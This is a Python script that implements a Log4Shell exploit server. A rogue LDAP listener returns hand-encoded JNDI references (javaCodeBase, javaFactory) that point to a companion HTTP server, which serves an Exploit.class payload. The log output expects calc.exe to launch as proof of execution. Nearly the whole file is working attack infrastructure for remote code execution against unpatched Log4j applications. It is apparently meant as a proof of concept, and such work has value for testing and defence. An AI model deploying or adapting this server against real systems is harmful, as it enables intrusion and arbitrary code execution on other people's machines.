#!/usr/bin/env python3
import socket
import sys
import argparse
from urllib.parse import urlparse
from http.server import HTTPServer, SimpleHTTPRequestHandler
import threading

class Log4jLDAPServer:
    def __init__(self, http_host='0.0.0.0', http_port=8888, ldap_port=1389):
        self.http_host = http_host
        self.http_port = http_port
        self.ldap_port = ldap_port
        self.payload_class = 'Exploit'

    def generate_ldap_response(self):
        """Generate LDAP response with correct ASN.1 encoding"""

        # Build the LDAP response pointing to our HTTP server
        http_url = f"http://localhost:{self.http_port}/"

        # LDAP SearchResultEntry
        response = bytearray()

        # Message envelope
        response.extend([0x30, 0x81, 0xff])  # SEQUENCE (will fix length later)
        response.extend([0x02, 0x01, 0x02])  # messageID: 2

        # SearchResultEntry
        response.extend([0x64, 0x81, 0xff])  # APPLICATION 4 (will fix length later)

        # Object name
        object_name = self.payload_class.encode()
        response.append(0x04)  # OCTET STRING
        response.append(len(object_name))
        response.extend(object_name)

        # Attributes sequence
        response.extend([0x30, 0x81, 0xff])  # SEQUENCE (will fix length later)

        # javaClassName attribute
        response.extend([0x30, 0x1c])  # SEQUENCE
        response.extend([0x04, 0x0d])  # type: "javaClassName"
        response.extend(b'javaClassName')
        response.extend([0x31, 0x0b])  # SET
        response.extend([0x04, 0x09])  # value
        response.extend(self.payload_class.encode())

        # javaCodeBase attribute
        response.extend([0x30, len(http_url) + 16])  # SEQUENCE
        response.extend([0x04, 0x0c])  # type: "javaCodeBase"
        response.extend(b'javaCodeBase')
        response.extend([0x31, len(http_url) + 2])  # SET
        response.extend([0x04, len(http_url)])  # value
        response.extend(http_url.encode())

        # objectClass attribute
        response.extend([0x30, 0x19])  # SEQUENCE
        response.extend([0x04, 0x0b])  # type: "objectClass"
        response.extend(b'objectClass')
        response.extend([0x31, 0x0a])  # SET
        response.extend([0x04, 0x08])  # value
        response.extend(b'javaNamingReference')

        # javaFactory attribute
        response.extend([0x30, 0x1a])  # SEQUENCE
        response.extend([0x04, 0x0b])  # type: "javaFactory"
        response.extend(b'javaFactory')
        response.extend([0x31, 0x0b])  # SET
        response.extend([0x04, 0x09])  # value
        response.extend(self.payload_class.encode())

        # Fix the lengths (simplified - works for our case)
        # Calculate actual attribute sequence length
        attr_len = len(response) - 11
        response[9] = attr_len & 0xFF

        # Fix SearchResultEntry length
        entry_len = attr_len + len(object_name) + 2
        response[6] = entry_len & 0xFF

        # Fix message envelope length
        msg_len = entry_len + 6
        response[2] = msg_len & 0xFF

        return bytes(response)

    def handle_ldap_connection(self, conn, addr):
        print(f"[LDAP] Connection from {addr[0]}:{addr[1]}")

        try:
            # Read bind request
            data = conn.recv(1024)
            print(f"[LDAP] Received bind request ({len(data)} bytes)")

            # Send bind response (success)
            bind_response = bytes([
                0x30, 0x0c,  # SEQUENCE
                0x02, 0x01, 0x01,  # messageID
                0x61, 0x07,  # BindResponse
                0x0a, 0x01, 0x00,  # success
                0x04, 0x00,  # matchedDN
                0x04, 0x00   # errorMessage
            ])
            conn.send(bind_response)
            print("[LDAP] Sent bind response")

            # Read search request
            data = conn.recv(1024)
            print(f"[LDAP] Received search request ({len(data)} bytes)")

            # Send search result
            search_result = self.generate_ldap_response()
            conn.send(search_result)
            print(f"[LDAP] Sent SearchResultEntry with javaCodeBase=http://localhost:{self.http_port}/")

            # Send SearchResultDone
            search_done = bytes([
                0x30, 0x0c,  # SEQUENCE
                0x02, 0x01, 0x02,  # messageID
                0x65, 0x07,  # SearchResultDone
                0x0a, 0x01, 0x00,  # success
                0x04, 0x00,  # matchedDN
                0x04, 0x00   # errorMessage
            ])
            conn.send(search_done)
            print("[LDAP] Sent SearchResultDone")

        except Exception as e:
            print(f"[LDAP] Error: {e}")
        finally:
            conn.close()

    def start_ldap_server(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind(('0.0.0.0', self.ldap_port))
        sock.listen(5)
        print(f"[+] LDAP server listening on 0.0.0.0:{self.ldap_port}")

        while True:
            conn, addr = sock.accept()
            thread = threading.Thread(target=self.handle_ldap_connection, args=(conn, addr))
            thread.daemon = True
            thread.start()

    def start_http_server(self):
        class ExploitHandler(SimpleHTTPRequestHandler):
            def do_GET(self):
                print(f"[HTTP] Request from {self.client_address[0]}: {self.path}")

                if 'Exploit' in self.path or self.path == '/':
                    try:
                        with open('Exploit.class', 'rb') as f:
                            content = f.read()

                        self.send_response(200)
                        self.send_header('Content-Type', 'application/java-vm')
                        self.send_header('Content-Length', str(len(content)))
                        self.end_headers()
                        self.wfile.write(content)
                        print(f"[+] Served Exploit.class ({len(content)} bytes)")
                        print("[!!!] Exploit class downloaded - check for calc.exe!")
                    except FileNotFoundError:
                        print("[!] Exploit.class not found in current directory")
                        self.send_error(404)
                else:
                    self.send_error(404)

            def log_message(self, format, *args):
                pass  # Suppress default HTTP logs

        server = HTTPServer((self.http_host, self.http_port), ExploitHandler)
        print(f"[+] HTTP server listening on {self.http_host}:{self.http_port}")
        server.serve_forever()

    def run(self):
        print("=" * 60)
        print("Log4Shell LDAP/HTTP Exploit Server")
        print("=" * 60)

        # Start LDAP server in background
        ldap_thread = threading.Thread(target=self.start_ldap_server)
        ldap_thread.daemon = True
        ldap_thread.start()

        # Run HTTP server in main thread
        try:
            self.start_http_server()
        except KeyboardInterrupt:
            print("\n[*] Shutting down...")

if __name__ == "__main__":
    server = Log4jLDAPServer()
    server.run()